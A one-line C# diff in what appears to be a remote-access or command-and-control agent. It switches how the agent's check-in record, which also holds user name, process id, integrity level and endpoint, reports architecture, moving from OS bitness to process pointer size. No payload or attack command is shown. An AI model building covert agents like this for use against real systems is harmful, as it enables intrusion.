@@ -144,7 +144,7 @@ namespace Agent
                 UserName = userName,
                 ProcessId = process.Id,
                 ProcessName = process.ProcessName,
-                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
                 Version = "Net v2.1",
